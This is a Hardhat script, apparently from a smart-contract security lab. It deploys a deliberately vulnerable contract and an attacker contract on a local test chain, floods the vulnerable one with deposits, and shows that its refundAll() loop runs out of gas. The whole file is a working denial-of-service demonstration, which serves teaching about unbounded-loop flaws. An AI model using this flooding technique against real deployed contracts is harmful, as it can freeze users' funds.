const { ethers } = require("hardhat");

async function main() {
  console.log("🚀 Initiating Denial of Service (DoS) attack on SC10_DoS_Vulnerable...");

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker, ...others] = await ethers.getSigners();
  console.log(`Deployer Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. DEPLOY THE CONTRACTS ---
  console.log("\n📦 Deploying contracts...");

  const VulnerableContract = await ethers.getContractFactory("SC10_DoS_Vulnerable");
  const vulnerable = await VulnerableContract.deploy();
  await vulnerable.waitForDeployment();
  console.log(`SC10_DoS_Vulnerable deployed at: ${vulnerable.target}`);

  const AttackerContract = await ethers.getContractFactory("SC10_DoSAttacker");
  const attackerContract = await AttackerContract.deploy(vulnerable.target);
  await attackerContract.waitForDeployment();
  console.log(`SC10_DoSAttacker deployed at: ${attackerContract.target}`);

  // --- 3. FUND THE VULNERABLE CONTRACT ---
  console.log("\n💰 Funding contract with 50 ETH from deployer...");
  const fundTx = await vulnerable.connect(deployer).deposit({
    value: ethers.parseEther("50.0"),
  });
  await fundTx.wait();
  console.log("✅ Contract funded with 50 ETH");

  // --- 4. CHECK INITIAL STATE ---
  console.log("\n📊 Initial State:");
  let userCount = Number(await vulnerable.getUserCount());
  let contractBalance = await vulnerable.getContractBalance();
  console.log(`   - User Count: ${userCount}`);
  console.log(`   - Contract Balance: ${ethers.formatEther(contractBalance)} ETH`);

  // --- 5. ADD SOME LEGITIMATE USERS ---
  console.log("\n👥 Adding legitimate users to the contract...");
  for (let i = 0; i < Math.min(5, others.length); i++) {
    const tx = await vulnerable.connect(others[i]).deposit({
      value: ethers.parseEther("1.0"),
    });
    await tx.wait();
  }

  userCount = await vulnerable.getUserCount();
  console.log(`   - User Count After: ${userCount}`);

  // --- 6. EXECUTE THE FLOODING ATTACK ---
  console.log("\n💥 ATTACKING: Flooding the contract with many deposits...");
  console.log("   - Attacker is adding hundreds of fake deposits...");

  // The attacker floods the contract with many deposits
  const floodAmount = 50; // Create 50 deposits from the attacker account
  const floodTx = await attackerContract.connect(attacker).floodContract(floodAmount, {
    value: ethers.parseEther((floodAmount * 0.1).toString()),
  });
  await floodTx.wait();
  console.log(`✅ Successfully added ${floodAmount} deposits from attacker account!`);

  // --- 7. CHECK STATE AFTER FLOODING ---
  console.log("\n📊 State After Flooding:");
  userCount = Number(await vulnerable.getUserCount());
  contractBalance = await vulnerable.getContractBalance();
  const attackerBalance = await vulnerable.getBalance(attackerContract.target);

  console.log(`   - User Count: ${userCount}`);
  console.log(`   - Contract Balance: ${ethers.formatEther(contractBalance)} ETH`);
  console.log(`   - Attacker's Balance in Contract: ${ethers.formatEther(attackerBalance)} ETH`);

  // --- 8. ATTEMPT LEGITIMATE WITHDRAWAL ---
  console.log("\n⏰ Attempting legitimate user withdrawal...");
  try {
    const txGasLimit = 500000; // Limited gas to simulate realistic scenario
    const withdrawTx = await vulnerable.connect(others[0]).withdraw(
      ethers.parseEther("0.5"),
      { gasLimit: txGasLimit }
    );
    await withdrawTx.wait();
    console.log("✅ Legitimate withdrawal successful!");
  } catch (error) {
    console.log("❌ Legitimate withdrawal failed: ", error.reason || "Out of gas or transaction reverted");
  }

  // --- 9. ATTEMPT REFUND ALL (WILL LIKELY FAIL OR USE EXCESSIVE GAS) ---
  console.log("\n💥 Attempting refundAll() - This should fail or use excessive gas...");
  try {
    // Set a gas limit that's less than what's needed with many users
    const gasLimit = 2000000; // Reasonable gas limit for a block
    const refundTx = await vulnerable.refundAll({ gasLimit });
    const receipt = await refundTx.wait();
    
    if (receipt) {
      console.log(`❌ UNEXPECTED: refundAll() succeeded with ${receipt.gasUsed} gas used`);
    }
  } catch (error) {
    console.log("✅ EXPECTED: refundAll() failed due to gas constraints!");
    console.log(`   - Error: ${error.reason || error.message.substring(0, 100)}`);
  }

  // --- 10. DEMONSTRATE THE SUCCESS OF THE DOS ATTACK ---
  console.log("\n" + "=".repeat(60));
  console.log("🎉 DENIAL OF SERVICE ATTACK SUCCESSFUL!");
  console.log("   - Contract is now unusable for bulk operations");
  console.log("   - refundAll() cannot be called safely");
  console.log(`   - Attacker created an unbounded state with ${userCount} users`);
  console.log("   - Any function iterating through all users will fail");

  console.log("\n📊 Attack Summary:");
  console.log(`   - Initial Users: 6`);
  console.log(`   - Final Users: ${userCount}`);
  console.log(`   - User Increase: ${userCount - 6}`);
  console.log(`   - Attack Complexity: O(n) - grows with each deposit`);
  console.log(`   - Legitimate Impact: refundAll() now requires multiple calls or fails`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
